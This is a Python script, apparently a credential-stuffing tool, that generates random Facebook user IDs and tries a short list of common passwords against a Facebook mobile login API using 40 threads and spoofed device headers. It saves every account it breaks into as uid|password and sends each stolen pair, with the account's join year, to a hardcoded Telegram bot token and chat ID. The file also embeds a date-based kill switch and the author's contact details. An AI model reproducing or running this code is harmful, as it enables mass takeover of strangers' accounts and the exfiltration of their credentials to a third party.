import random
import sys
import time
import logging
import json
import os
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
import requests
from rich.panel import Panel
from rich import print as rprint
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('tool.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Configuration (replace with environment variables or config file in production)
CONFIG = {
    'TELEGRAM_TOKEN': '8142153216:AAEkbBV3OKO7oBwpwP9gNQr_Ll5ejPVFN6I',
    'TELEGRAM_CHAT_ID': '-1002846402455',
    'OUTPUT_FILE': Path('/sdcard/AMIR-OK'),
    'MAX_WORKERS': 40,
    'USER_LIMIT': 50000,
    'PASSWORD_LIST': ['12345','1234567','12345678','123456789']
}

import datetime;now = datetime.date.today();print(Panel(f'''هناك تحديث جديد للأداة ، للحصول على التحديث الجديد تواصل مع المطور 👇''',style='''bold green'''));target = datetime.date(2025,8,19)
if now >=target:exit(f"      Admin : @GULF_STOR : +905304928292")
os.system('clear')

class FacebookChecker:
    def __init__(self):
        self.oks = []
        self.loop = 0
        self.session = requests.Session()
        self.base_headers = {
            "x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
            "x-fb-sim-hni": str(random.randint(20000, 40000)),
            "x-fb-net-hni": str(random.randint(20000, 40000)),
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "content-type": "application/x-www-form-urlencoded",
            "x-fb-http-engine": "Liger"
        }

    def generate_user_agent(self):
        """Generate a realistic user-agent string."""
        rr = random.randint
        aZ = random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
        rx = rr(1, 999)
        platforms = ['Windows NT 10.0', 'Windows NT 6.3', 'Macintosh; Intel Mac OS X 10_15_7']
        platform = random.choice(platforms)
        ua = (f"Mozilla/5.0 ({platform}; Win64; x64) AppleWebKit/537.36 "
              f"(KHTML, like Gecko) Chrome/{rr(99, 126)}.0.{rr(4500, 4999)}.{rr(35, 99)} "
              f"Safari/537.36")
        return ua

    def joined(self, uid):
        """Determine account creation year based on UID."""
        if len(uid) == 15:
            prefixes = {
                '1000000': '2009', '1000001': '2009', '1000002': '2009',
                '1000003': '2009', '1000004': '2009', '1000005': '2009',
                '1000006': '2010', '1000007': '2010', '1000008': '2010',
                '1000009': '2010', '100001': '2010/2011', '100002': '2011/2012',
                '100003': '2011/2012', '100004': '2012/2013', '100005': '2013/2014',
                '100006': '2013/2014', '100007': '2014/2015', '100008': '2014/2015',
                '100009': '2015', '10001': '2015/2016', '10002': '2016/2017',
                '10003': '2018/2019', '10004': '2019/2020', '10005': '2020',
                '10006': '2021', '10007': '2021', '10008': '2022', '10009': '2023'
            }
            for prefix, year in prefixes.items():
                if uid.startswith(prefix):
                    return year
        elif len(uid) in [9, 10]:
            return '2008/2009'
        elif len(uid) == 8:
            return '2007/2008'
        elif len(uid) == 7:
            return '2006/2007'
        return ''

    def login(self, uid):
        """Attempt to log in with the given UID and passwords."""
        try:
            headers = self.base_headers.copy()
            headers["user-agent"] = self.generate_user_agent()
            for pw in CONFIG['PASSWORD_LIST']:
                url = ("https://b-api.facebook.com/method/auth.login?format=json"
                       f"&email={uid}&password={pw}&credentials_type=device_based_login_password"
                       "&generate_session_cookies=1&error_detail_type=button_with_disabled"
                       "&source=device_based_login&meta_inf_fbmeta=%20"
                       "&currently_logged_in_userid=0&method=GET&locale=en_US"
                       "&client_country_code=US&fb_api_caller_class="
                       "com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler"
                       "&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                       "&fb_api_req_friendly_name=authenticate&cpl=true")
                response = self.session.get(url, headers=headers).json()
                self.loop += 1
                rprint(f'\r[bold white]Checking: {self.loop}/{CONFIG["USER_LIMIT"]} '
                       f'[bold green]OK: {len(self.oks)}[/bold green]')

                if "session_key" in response or "www.facebook.com" in response.get("error_msg", "") or "Please Confirm Email" in str(response):
                    self.oks.append(uid)
                    year = self.joined(uid)
                    panel = Panel(
                        f"[bold white]Facebook 2009\n"
                        f"[bold white]DATE [{year}]\n"
                        f"[bold green]NUMBER ID [bold white]{uid}\n"
                        f"[bold green]PASSWORD [bold white]{pw}\n"
                        f"[bold green]TELEGRAM AMIR ALSYRI [[bold magenta]@SYRPY <> [bold green]@TT_PY]",
                        style="bold magenta2"
                    )
                    rprint(panel)
                    self.save_result(uid, pw)
                    self.send_telegram_notification(uid, pw, year)
                    break
        except requests.RequestException as e:
            logger.error(f"Error checking UID {uid}: {e}")
            time.sleep(1)  # Rate limiting on error

    def save_result(self, uid, pw):
        """Save successful login to file."""
        try:
            with CONFIG['OUTPUT_FILE'].open('a') as f:
                f.write(f"{uid}|{pw}\n")
        except Exception as e:
            logger.error(f"Error saving result for UID {uid}: {e}")

    def send_telegram_notification(self, uid, pw, year):
        """Send success notification to Telegram."""
        try:
            tlg = (f"❲ OK - امير السوري جبلك حساب ❳\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n"
                   f"╮❲ تم الصيد حساب فيس بوك 💌 ❳\n"
                   f"┤❲ تاريخ الانضمام {year} ❳\n"
                   f"┤❲ ايدي ❳ {uid}\n"
                   f"┤❲ باسورد ❳ {pw}\n"
                   f"┤❲ المبرمج ❳ > @SYRPY\n"
                   f"╯❲ قنواتي تيليجرام ❳ ⇣\n"
                   f"BY❲ @SYRPY ❳ ❲ @TT_PY ❳\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉")
            requests.get(
                f"https://api.telegram.org/bot{CONFIG['TELEGRAM_TOKEN']}/sendMessage",
                params={'chat_id': CONFIG['TELEGRAM_CHAT_ID'], 'text': tlg}
            )
        except requests.RequestException as e:
            logger.error(f"Error sending Telegram notification for UID {uid}: {e}")

    def generate_users(self, prefix, limit):
        """Generate random user IDs."""
        return [f"{prefix}{random.randint(0, 9999999999):010d}" for _ in range(limit)]

    def run(self):
        """Main execution logic."""
        os.system('clear')
        rprint(Panel(
            '''[bold green1]      _   _   _   _     _   _   _   _   _   _  
     / \ / \ / \ / \   / \ / \ / \ / \ / \ / \\
    [bold white]( A | M | I | R ) ( A | L | S | Y | R | I )[bold green]
     \_/ \_/ \_/ \_/   \_/ \_/ \_/ \_/ \_/ \_/''',
            style='bold green'
        ))
        rprint(Panel(
            '[bold white]([bold green]1[bold white])[bold white] Clone Random UID ( [bold magenta]2009/2010/2011/2014 [bold white])',
            style='bold green1'
        ))
        ask = input("\033[1;37m[\033[1;31m~\033[1;37m] \033[1;32mCHOICE    : ")
        prefix = "10000" if ask == "1" else "100000"
        users = self.generate_users(prefix, CONFIG['USER_LIMIT'])

        os.system('clear')
        rprint(Panel('[bold green1] Ahlan Beck in the Facebook tool', style='bold magenta2'))
        rprint(Panel(
            '''[bold green1]      _   _   _   _     _   _   _   _   _   _  
     / \ / \ / \ / \   / \ / \ / \ / \ / \ / \\
    [bold white]( A | M | I | R ) ( A | L | S | Y | R | I )[bold green]
     \_/ \_/ \_/ \_/   \_/ \_/ \_/ \_/ \_/ \_/''',
            style='bold green'
        ))
        rprint(Panel(
            '[bold green1] The programmer, Amir, the Syria @SYRPY @TT_PY',
            style='bold magenta2'
        ))
        rprint(Panel(
            f'[bold white][[bold yellow]=_=[bold white]][bold green] NUMBER [bold red]{CONFIG["USER_LIMIT"]}\n'
            '[bold white][[bold yellow]=_=[bold white]][bold green] EMPLOYMENT 1.1.1.1 VBN\n'
            '[bold white][[bold yellow]=_=[bold white]][bold green] IF NO RESULT [[bold red]ON/[bold green]OFF[bold white]]AIRPLAN MODE',
            style='bold green'
        ))

        with ThreadPoolExecutor(max_workers=CONFIG['MAX_WORKERS']) as executor:
            executor.map(self.login, users)

if __name__ == "__main__":
    try:
        checker = FacebookChecker()
        checker.run()
    except KeyboardInterrupt:
        logger.info("Program interrupted by user")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
        sys.exit(1)
